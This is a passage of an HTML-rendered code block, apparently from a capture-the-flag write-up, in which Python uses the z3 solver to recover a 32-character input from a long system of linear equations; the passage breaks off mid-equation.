class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">solver = Solver()</span><br><span class="line">v34 = [Int(&apos;v34%d&apos;%i) for i in range(32) ]</span><br><span class="line">solver.add(82 * v34[16] + 58 * v34[25] + 76 * v34[21]</span><br><span class="line">     + 31 * v34[9]</span><br><span class="line">     + 87 * v34[28]</span><br><span class="line">     + 54 * v34[2]</span><br><span class="line">     + 74 * v34[5]</span><br><span class="line">     + 99 * v34[26]</span><br><span class="line">     + 94 * v34[3]</span><br><span class="line">     + 84 * v34[19]</span><br><span class="line">     + 32 * v34[15]</span><br><span class="line">     + 90 * v34[27]</span><br><span class="line">     + 16 * v34[14]</span><br><span class="line">     + 19 * v34[8]</span><br><span class="line">     + 33 * v34[20]</span><br><span class="line">     + 35 * v34[31]</span><br><span class="line">     + 65 * v34[29]</span><br><span class="line">     + 47 * v34[12]</span><br><span class="line">     + 3 * v34[1]</span><br><span class="line">     + 57 * v34[7]</span><br><span class="line">     + 5 * v34[17]</span><br><span class="line">     + 70 * v34[13]</span><br><span class="line">     + 28 * v34[24]</span><br><span class="line">     + 79 * v34[11]</span><br><span class="line">     + 63 * v34[23]</span><br><span class="line">     + 66 * v34[30]</span><br><span class="line">     + 28 * v34[10]</span><br><span class="line">     + v34[4] + 81 * v34[6] + 61 * v34[18] + 31 * v34[22] + 71 * v34[0] == 145397)</span><br><span class="line">solver.add(55 * v34[6]</span><br><span class="line">     + 38 * v34[9]</span><br><span class="line">     + 39 * v34[18]</span><br><span class="line">     + 73 * v34[24]</span><br><span class="line">     + 86 * v34[13]</span><br><span class="line">     + 18 * v34[11]</span><br><span class="line">     + 40 * v34[21]</span><br><span class="line">     + 40 * v34[26]</span><br><span class="line">     + 54 * v34[14]</span><br><span class="line">     + 81 * v34[10]</span><br><span class="line">     + 71 * v34[27]</span><br><span class="line">     + 20 * v34[8]</span><br><span class="line">     + 16 * v34[28]</span><br><span class="line">     + 65 * v34[30]</span><br><span class="line">     + 87 * v34[3]</span><br><span class="line">     + 14 * v34[16]</span><br><span class="line">     + v34[5]</span><br><span class="line">     + 41 * v34[0]</span><br><span class="line">     + 58 * v34[15]</span><br><span class="line">     + 73 * v34[2]</span><br><span class="line">     + 46 * v34[23]</span><br><span class="line">     + 7 * v34[19]</span><br><span class="line">     + 89 * v34[17]</span><br><span class="line">     + 65 * v34[25]</span><br><span class="line">     + 43 * v34[7]</span><br><span class="line">     + 6 * v34[20] + 60 * v34[12] + 40 * v34[31] + 57 * v34[29] + 40 * v34[4] + 30 * v34[1] + 63 * v34[22] == 127517)</span><br><span class="line">solver.add(28 * v34[6] + 17 * v34[21] + 18 * v34[3] + 53 * v34[10]</span><br><span class="line">     + 82 * v34[14]</span><br><span class="line">     + 70 * v34[5]</span><br><span class="line">     + 84 * v34[2]</span><br><span class="line">     + 57 * v34[19]</span><br><span class="line">     + 92 * v34[27]</span><br><span class="line">     + 57 * v34[11]</span><br><span class="line">     + 77 * v34[4]</span><br><span class="line">     + 49 * v34[8]</span><br><span class="line">     + 62 * v34[29]</span><br><span class="line">     + 97 * v34[22]</span><br><span class="line">     + 47 * v34[1]</span><br><span class="line">     + 30 * v34[16]</span><br><span class="line">     + 45 * v34[30]</span><br><span class="line">     + 94 * v34[28]</span><br><span class="line">     + 6 * v34[9]</span><br><span class="line">     + 83 * v34[20]</span><br><span class="line">     + 18 * v34[23]</span><br><span class="line">     + 97 * v34[15]</span><br><span class="line">     + 11 * v34[12]</span><br><span class="line">     + 35 * v34[7]</span><br><span class="line">     + 81 * v34[26]</span><br><span class="line">     + 67 * v34[13]</span><br><span class="line">     + 11 * v34[31]</span><br><span class="line">     + 84 * v34[24] + 63 * v34[25] + 61 * v34[18] == 141411)</span><br><span class="line">solver.add(86 * v34[23] + 52 * v34[1] + 14 * v34[24]</span><br><span class="line">     + 46 * v34[6]</span><br><span class="line">     + 56 * v34[7]</span><br><span class="line">     + 13 * v34[2]</span><br><span class="line">     + 82 * v34[11]</span><br><span class="line">     + 49 * v34[30]</span><br><span class="line">     + 97 * v34[18]</span><br><span class="line">     + 50 * v34[14]</span><br><span class="line">     + 83 * v34[27]</span><br><span class="line">     + 38 * v34[13]</span><br><span class="line">     + 49 * v34[29]</span><br><span class="line">     + 9 * v34[4]</span><br><span class="line">     + 91 * v34[20]</span><br><span class="line">     + 33 * v34[25]</span><br><span class="line">     + 4 * v34[22]</span><br><span class="line">     + 5 * v34[17]</span><br><span class="line">     + 61 * v34[15]</span><br><span class="line">     + 65 * v34[3]</span><br><span class="line">     + 68 * v34[28]</span><br><span class="line">     + 6 * v34[16]</span><br><span class="line">     + (v34[8] * 64)</span><br><span class="line">     + 56 * v34[9]</span><br><span class="line">     + 67 * v34[10]</span><br><span class="line">     + 5 * v34[5]</span><br><span class="line">     + v34[21]</span><br><span class="line">     + 10 * v34[19] + 83 * v34[12] + 37 * v34[26] + 85 * v34[0] == 117383)</span><br><span class="line">solver.add(53 * v34[3] + 91 * v34[2] + 57 * v34[25] + 66 * v34[20] + 9 * v34[28]</span><br><span class="line">     + 63 * v34[5]</span><br><span class="line">     + 20 * v34[4]</span><br><span class="line">     + 96 * v34[8]</span><br><span class="line">     + 39 * v34[11]</span><br><span class="line">     + 91 * v34[1]</span><br><span class="line">     + 40 * v34[9]</span><br><span class="line">     + 85 * v34[14]</span><br><span class="line">     + 62 * v34[16]</span><br><span class="line">     + 95 * v34[19]</span><br><span class="line">     + 34 * v34[22]</span><br><span class="line">     + 67 * v34[31]</span><br><span class="line">     + 51 * v34[27]</span><br><span class="line">     + 45 * v34[26]</span><br><span class="line">     + 92 * v34[15]</span><br><span class="line">     + 91 * v34[21]</span><br><span class="line">     + 85 * v34[13]</span><br><span class="line">     + 12 * v34[7]</span><br><span class="line">     + 26 * v34[23]</span><br><span class="line">     + 56 * v34[30]</span><br><span class="line">     + 82 * v34[18]</span><br><span class="line">     + 72 * v34[17]</span><br><span class="line">     + 54 * v34[6]</span><br><span class="line">     + 17 * v34[12]</span><br><span class="line">     + 84 * v34[29]</span><br><span class="line">     + 17 * v34[0] + 8 * v34[24] + 63 * v34[10] == 156152)</span><br><span class="line">solver.add(55 * v34[23] + 88 * v34[9]</span><br><span class="line">     + 48 * v34[4]</span><br><span class="line">     + 83 * v34[13]</span><br><span class="line">     + 66 * v34[7]</span><br><span class="line">     + 60 * v34[30]</span><br><span class="line">     + 57 * v34[6]</span><br><span class="line">     + 85 * v34[17]</span><br><span class="line">     + 71 * v34[28]</span><br><span class="line">     + 98 * v34[24]</span><br><span class="line">     + 83 * v34[10]</span><br><span class="line">     + 12 * v34[1]</span><br><span class="line">     + 72 * v34[31]</span><br><span class="line">     + 12 * v34[22]</span><br><span class="line">     + 80 * v34[20]</span><br><span class="line">     + 15 * v34[19]</span><br><span class="line">     + 81 * v34[21]</span><br><span class="line">     + 87 * v34[0]</span><br><span class="line">     + 37 * v34[16]</span><br><span class="line">     + 4 * v34[15]</span><br><span class="line">     + 41 * v34[3]</span><br><span class="line">     + 84 * v34[26]</span><br><span class="line">     + 56 * v34[25]</span><br><span class="line">     + 84 * v34[14]</span><br><span class="line">     + 41 * v34[27]</span><br><span class="line">     + 98 * v34[18]</span><br><span class="line">     + 18 * v34[2] + 95 * v34[11] + 33 * v34[29] + 66 * v34[8] == 148963)</span><br><span class="line">solver.add(43 * v34[16] + 47 * v34[0] + 53 * v34[24] + 75 * v34[11] + 57 * v34[21]</span><br><span class="line">     + 63 * v34[12]</span><br><span class="line">     + 4 * v34[14]</span><br><span class="line">     + 59 * v34[31]</span><br><span class="line">     + 15 * v34[23]</span><br><span class="line">     + 12 * v34[25]</span><br><span class="line">     + 58 * v34[5]</span><br><span class="line">     + 40 * v34[4]</span><br><span class="line">     + 26 * v34[30]</span><br><span class="line">     + 8 * v34[15]</span><br><span class="line">     + 25 * v34[6]</span><br><span class="line">     + 97 * v34[10]</span><br><span class="line">     + 12 * v34[28]</span><br><span class="line">     + 74 * v34[26]</span><br><span class="line">     + 65 * v34[8]</span><br><span class="line">     + 93 * v34[27]</span><br><span class="line">     + 18 * v34[22]</span><br><span class="line">     + 84 * v34[2]</span><br><span class="line">     + 7 * v34[1]</span><br><span class="line">     + 22 * v34[18]</span><br><span class="line">     + 9 * v34[17]</span><br><span class="line">     + 89 * v34[19]</span><br><span class="line">     + 72 * v34[13]</span><br><span class="line">     + 47 * v34[20]</span><br><span class="line">     + 7 * v34[29] + 8 * v34[9] + 24 * v34[7] + 75 * v34[3] == 121517)</span><br><span class="line">solver.add(77 * v34[30] + 89 * v34[31] + 55 * v34[7] + 86 * v34[17]</span><br><span class="line">     + 74 * v34[0]</span><br><span class="line">     + 72 * v34[4]</span><br><span class="line">     + 27 * v34[20]</span><br><span class="line">     + 88 * v34[9]</span><br><span class="line">     + (v34[21] * 64)</span><br><span class="line">     + 52 * v34[15]</span><br><span class="line">     + 4 * v34[19]</span><br><span class="line">     + 8 * v34[1]</span><br><span class="line">     + 16 * v34[13]</span><br><span class="line">     + 54 * v34[25]</span><br><span class="line">     + 8 * v34[29]</span><br><span class="line">     + 52 * v34[23]</span><br><span class="line">     + 14 * v34[10]</span><br><span class="line">     + 88 * v34[18]</span><br><span class="line">     + 33 * v34[8]</span><br><span class="line">     + 99 * v34[27]</span><br><span class="line">     + 65 * v34[14]</span><br><span class="line">     + 66 * v34[5]</span><br><span class="line">     + 36 * v34[6]</span><br><span class="line">     + 58 * v34[16]</span><br><span class="line">     + 63 * v34[22]</span><br><span class="line">     + 93 * v34[3]</span><br><span class="line">     + 96 * v34[11]</span><br><span class="line">     + 26 * v34[26]</span><br><span class="line">     + 65 * v34[12] + 42 * v34[28] + 14 * v34[2] + 57 * v34[24] == 151446)</span><br><span class="line">solver.add(53 * v34[24] + 95 * v34[27] + 51 * v34[7]</span><br><span class="line">     + 42 * v34[4]</span><br><span class="line">     + 78 * v34[8]</span><br><span class="line">     + 45 * v34[25]</span><br><span class="line">     + 63 * v34[30]</span><br><span class="line">     + 85 * v34[26]</span><br><span class="line">     + 30 * v34[29]</span><br><span class="line">     + 83 * v34[14]</span><br><span class="line">     + 62 * v34[31]</span><br><span class="line">     + 71 * v34[22]</span><br><span class="line">     + 45 * v34[17]</span><br><span class="line">     + (v34[6] *64 )</span><br><span class="line">     + 87 * v34[23]</span><br><span class="line">     + 49 * v34[28]</span><br><span class="line">     + 14 * v34[0]</span><br><span class="line">     + 4 * v34[21]</span><br><span class="line">     + 63 * v34[5]</span><br><span class="line">     + 53 * v34[13]</span><br><span class="line">     + 19 * v34[19]</span><br><span class="line">     + 44 * v34[16]</span><br><span class="line">     + 5 * v34[3]</span><br><span class="line">     + 74 * v34[15]</span><br><span class="line">     + 19 * v34[18]</span><br><span class="line">     + 89 * v34[11]</span><br><span class="line">     + 11 * v34[20]</span><br><span class="line">     + 34 * v34[12] + 14 * v34[1] + 87 * v34[10] + 63 * v34[9] + 70 * v34[2] == 142830)</span><br><span class="line">solver.add(69 * v34[0]</span><br><span class="line">     + 67 * v34[9]</span><br><span class="line">     + 57 * v34[15]</span><br><span class="line">     + 77 * v34[10]</span><br><span class="line">     + 67 * v34[26]</span><br><span class="line">     + 94 * v34[11]</span><br><span class="line">     + 13 * v34[29]</span><br><span class="line">      + 11 * v34[22]</span><br><span class="line">      + 41 * v34[5]</span><br><span class="line">      + 38 * v34[13]</span><br><span class="line">      + 90 * v34[31]</span><br><span class="line">      + 68 * v34[7]</span><br><span class="line">      + 56 * v34[14]</span><br><span class="line">      + 4 * v34[23]</span><br><span class="line">      + 66 * v34[28]</span><br><span class="line">      + 28 * v34[1]</span><br><span class="line">      + 6 * v34[12]</span><br><span class="line">      + 91 * v34[16]</span><br><span class="line">      + 59 * v34[3]</span><br><span class="line">      + 81 * v34[17]</span><br><span class="line">      + 44 * v34[2]</span><br><span class="line">      + 33 * v34[24]</span><br><span class="line">      + 34 * v34[19]</span><br><span class="line">      + 17 * v34[18]</span><br><span class="line">      + 77 * v34[25]</span><br><span class="line">      + 25 * v34[8]</span><br><span class="line">      + 8 * v34[6]</span><br><span class="line">      + 10 * v34[30]</span><br><span class="line">      + 66 * v34[20]</span><br><span class="line">     + 41 * v34[27]</span><br><span class="line">     + 29 * v34[21] == 122585)</span><br><span class="line">solver.add(31 * v34[9] + 17 * v34[4] + 6 * v34[28] + 23 * v34[25]</span><br><span class="line">      + 32 * v34[3]</span><br><span class="line">      + 72 * v34[15]</span><br><span class="line">      + 41 * v34[26]</span><br><span class="line">      + 33 * v34[30]</span><br><span class="line">      + 82 * v34[13]</span><br><span class="line">      + 20 * v34[0]</span><br><span class="line">      + 7 * v34[12]</span><br><span class="line">      + 25 * v34[29]</span><br><span class="line">      + 39 * v34[21]</span><br><span class="line">      + 57 * v34[14]</span><br><span class="line">      + 14 * v34[16]</span><br><span class="line">      + 24 * v34[24]</span><br><span class="line">      + 37 * v34[22]</span><br><span class="line">      + 71 * v34[10]</span><br><span class="line">      + 65 * v34[23]</span><br><span class="line">      + 46 * v34[8]</span><br><span class="line">      + 40 * v34[19]</span><br><span class="line">      + 77 * v34[27]</span><br><span class="line">      + 80 * v34[18]</span><br><span class="line">      + 88 * v34[6]</span><br><span class="line">      + 20 * v34[31]</span><br><span class="line">      + 83 * v34[11]</span><br><span class="line">      + 73 * v34[1]</span><br><span class="line">      + 8 * v34[5]</span><br><span class="line">      + 15 * v34[20] + 70 * v34[7] + 24 * v34[17] + 16 * v34[2] == 105293)</span><br><span class="line">solver.add(25 * v34[21] + 79 * v34[3] + 41 * v34[24]</span><br><span class="line">      + 45 * v34[30]</span><br><span class="line">      + 82 * v34[20]</span><br><span class="line">      + 86 * v34[19]</span><br><span class="line">      + 99 * v34[9]</span><br><span class="line">      + 96 * v34[22]</span><br><span class="line">      + 85 * v34[28]</span><br><span class="line">      + 70 * v34[5]</span><br><span class="line">      + 77 * v34[23]</span><br><span class="line">      + 80 * v34[11]</span><br><span class="line">      + 40 * v34[31]</span><br><span class="line">      + 66 * v34[12]</span><br><span class="line">      + 12 * v34[2]</span><br><span class="line">      + 77 * v34[15]</span><br><span class="line">      + 72 * v34[4]</span><br><span class="line">      + 42 * v34[26]</span><br><span class="line">      + 81 * v34[27]</span><br><span class="line">      + 90 * v34[13]</span><br><span class="line">      + 37 * v34[16]</span><br><span class="line">      + 29 * v34[17]</span><br><span class="line">      + 20 * v34[29]</span><br><span class="line">      + 85 * v34[6]</span><br><span class="line">      + 6 * v34[7]</span><br><span class="line">      + 2 * v34[0]</span><br><span class="line">      + 72 * v34[1]</span><br><span class="line">      + 75 * v34[14] + 40 * v34[25] + 29 * v34[8] + 25 * v34[10] == 151962)</span><br><span class="line">solver.add(83 * v34[11] + 75 * v34[1] + 42 * v34[31]</span><br><span class="line">      + 95 * v34[30]</span><br><span class="line">      + 58 * v34[8]</span><br><span class="line">      + 47 * v34[13]</span><br><span class="line">      + 65 * v34[15]</span><br><span class="line">      + 24 * v34[17]</span><br><span class="line">      + 97 * v34[10]</span><br><span class="line">      + 24 * v34[21]</span><br><span class="line">      + 28 * v34[0]</span><br><span class="line">      + 77 * v34[5]</span><br><span class="line">      + 97 * v34[6]</span><br><span class="line">      + 24 * v34[26]</span><br><span class="line">      + 32 * v34[12]</span><br><span class="line">      + 5 * v34[25]</span><br><span class="line">      + 55 * v34[28]</span><br><span class="line">      + 9 * v34[23]</span><br><span class="line">      + 85 * v34[4]</span><br><span class="line">      + 6 * v34[9]</span><br><span class="line">      + 61 * v34[19]</span><br><span class="line">      + 12 * v34[3]</span><br><span class="line">      + 76 * v34[7]</span><br><span class="line">      + 36 * v34[27]</span><br><span class="line">      + 77 * v34[24]</span><br><span class="line">      + 24 * v34[29]</span><br><span class="line">      + 67 * v34[14]</span><br><span class="line">      + 19 * v34[16] + 47 * v34[20] + 13 * v34[22] == 125609)</span><br><span class="line">solver.add(30 * v34[25] + 41 * v34[28] + 65 * v34[10] + v34[1]</span><br><span class="line">      + 88 * v34[3]</span><br><span class="line">      + 90 * v34[0]</span><br><span class="line">      + 4 * v34[23]</span><br><span class="line">      + 46 * v34[7]</span><br><span class="line">      + 54 * v34[16]</span><br><span class="line">      + 16 * v34[6]</span><br><span class="line">      + 89 * v34[22]</span><br><span class="line">      + 76 * v34[27]</span><br><span class="line">      + 38 * v34[17]</span><br><span class="line">      + 3 * v34[5]</span><br><span class="line">      + 70 * v34[14]</span><br><span class="line">      + 3 * v34[24]</span><br><span class="line">      + 24 * v34[13]</span><br><span class="line">      + 54 * v34[2]</span><br><span class="line">      + 20 * v34[8]</span><br><span class="line">      + 83 * v34[12]</span><br><span class="line">      + 21 * v34[15]</span><br><span class="line">      + 77 * v34[18]</span><br><span class="line">      + 31 * v34[19]</span><br><span class="line">      + 59 * v34[21]</span><br><span class="line">      + 33 * v34[20]</span><br><span class="line">      + 84 * v34[11]</span><br><span class="line">      + 19 * v34[29]</span><br><span class="line">      + 38 * v34[26]</span><br><span class="line">      + 63 * v34[31] + 16 * v34[30] + 15 * v34[4] + 39 * v34[9] == 123069)</span><br><span class="line">solver.add(6 * v34[9] + 19 * v34[19] + 27 * v34[18]</span><br><span class="line">      + 48 * v34[4]</span><br><span class="line">      + 13 * v34[20]</span><br><span class="line">      + 44 * v34[10]</span><br><span class="line">      + 70 * v34[12]</span><br><span class="line">      + 44 * v34[17]</span><br><span class="line">      + 22 * v34[23]</span><br><span class="line">      + 55 * v34[14]</span><br><span class="line">      + 73 * v34[26]</span><br><span class="line">      + 55 * v34[8]</span><br><span class="line">      + 58 * v34[11]</span><br><span class="line">      + 31 * v34[30]</span><br><span class="line">      + 78 * v34[29]</span><br><span class="line">      + 19 * v34[25]</span><br><span class="line">      + 52 * v34[31]</span><br><span class="line">      + 27 * v34[21]</span><br><span class="line">      + 38 * v34[27]</span><br><span class="line">      + 40 * v34[28]</span><br><span class="line">      + 35 * v34[1]</span><br><span class="line">      + 48 * v34[22]</span><br><span class="line">      + 71 * v34[15]</span><br><span class="line">      + 24 * v34[6]</span><br><span class="line">      + 89 * v34[16]</span><br><span class="line">      + 37 * v34[3]</span><br><span class="line">      + 78 * v34[2] + 3 * v34[5] + 52 * v34[24] + 40 * v34[7] == 113842)</span><br><span class="line">solver.add(95 * v34[8] + 92 * v34[18] + 84 * v34[31] + 31 * v34[12]</span><br><span class="line">      + 35 * v34[10]</span><br><span class="line">      + 54 * v34[20]</span><br><span class="line">      + 26 * v34[29]</span><br><span class="line">      + 29 * v34[3]</span><br><span class="line">      + 2 * v34[23]</span><br><span class="line">      + 46 * v34[0]</span><br><span class="line">      + 30 * v34[26]</span><br><span class="line">      + 56 * v34[27]</span><br><span class="line">      + 100 * v34[11]</span><br><span class="line">      + 43 * v34[1]</span><br><span class="line">      + 15 * v34[4]</span><br><span class="line">      + 79 * v34[17]</span><br><span class="line">      + 12 * v34[5]</span><br><span class="line">      + 38 * v34[9]</span><br><span class="line">      + 3 * v34[30]</span><br><span class="line">      + 16 * v34[21]</span><br><span class="line">      + 19 * v34[13]</span><br><span class="line">      + 67 * v34[19]</span><br><span class="line">      + 37 * v34[28]</span><br><span class="line">      + v34[7]</span><br><span class="line">      + 73 * v34[16]</span><br><span class="line">      + 85 * v34[6]</span><br><span class="line">      + 17 * v34[14]</span><br><span class="line">      + 90 * v34[22]</span><br><span class="line">      + 15 * v34[2] + 43 * v34[25] + 96 * v34[24] == 119824)</span><br><span class="line">solver.add(36 * v34[22] + 69 * v34[28] + 77 * v34[6] + 92 * v34[20]</span><br><span class="line">      + 43 * v34[23]</span><br><span class="line">      + 16 * v34[19]</span><br><span class="line">      + 92 * v34[5]</span><br><span class="line">      + 49 * v34[26]</span><br><span class="line">      + 44 * v34[2]</span><br><span class="line">      + 26 * v34[29]</span><br><span class="line">      + (v34[25] * 64)</span><br><span class="line">      + 45 * v34[24]</span><br><span class="line">      + 99 * v34[11]</span><br><span class="line">      + 43 * v34[4]</span><br><span class="line">      + 75 * v34[21]</span><br><span class="line">      + 53 * v34[31]</span><br><span class="line">      + 18 * v34[18]</span><br><span class="line">      + 11 * v34[13]</span><br><span class="line">      + 52 * v34[0]</span><br><span class="line">      + 16 * v34[8]</span><br><span class="line">      + 9 * v34[7]</span><br><span class="line">      + 77 * v34[16]</span><br><span class="line">      + 33 * v34[10]</span><br><span class="line">      + 86 * v34[1]</span><br><span class="line">      + 33 * v34[3]</span><br><span class="line">      + 29 * v34[9]</span><br><span class="line">      + 6 * v34[12]</span><br><span class="line">      + 91 * v34[14]</span><br><span class="line">      + 36 * v34[15] + 94 * v34[27] + 13 * v34[30] + 89 * v34[17] == 135873)</span><br><span class="line">solver.add(16 * v34[7] + v34[15] + 82 * v34[9] + 60 * v34[29] + 68 * v34[2]</span><br><span class="line">      + 83 * v34[10]</span><br><span class="line">      + 47 * v34[5]</span><br><span class="line">      + 85 * v34[13]</span><br><span class="line">      + 22 * v34[8]</span><br><span class="line">      + 92 * v34[27]</span><br><span class="line">      + 75 * v34[28]</span><br><span class="line">      + 43 * v34[3]</span><br><span class="line">      + 29 * v34[22]</span><br><span class="line">      + 92 * v34[0]</span><br><span class="line">      + 54 * v34[16]</span><br><span class="line">      + 17 * v34[30]</span><br><span class="line">      + 78 * v34[18]</span><br><span class="line">      + 7 * v34[23]</span><br><span class="line">      + 69 * v34[21]</span><br><span class="line">      + 63 * v34[31]</span><br><span class="line">      + 71 * v34[4]</span><br><span class="line">      + 10 * v34[6]</span><br><span class="line">      + 66 * v34[14]</span><br><span class="line">      + 25 * v34[26]</span><br><span class="line">      + 32 * v34[1]</span><br><span class="line">      + 48 * v34[19]</span><br><span class="line">      + 86 * v34[11]</span><br><span class="line">      + 20 * v34[25]</span><br><span class="line">      + 78 * v34[20]</span><br><span class="line">      + 25 * v34[17] + 76 * v34[12] + 13 * v34[24] == 142509)</span><br><span class="line">solver.add(88 * v34[22] + 23 * v34[13] + 18 * v34[14] + 77 * v34[9]</span><br><span class="line">      + 56 * v34[30]</span><br><span class="line">      + 79 * v34[2]</span><br><span class="line">      + 71 * v34[29]</span><br><span class="line">      + 95 * v34[28]</span><br><span class="line">      + 87 * v34[24]</span><br><span class="line">      + 62 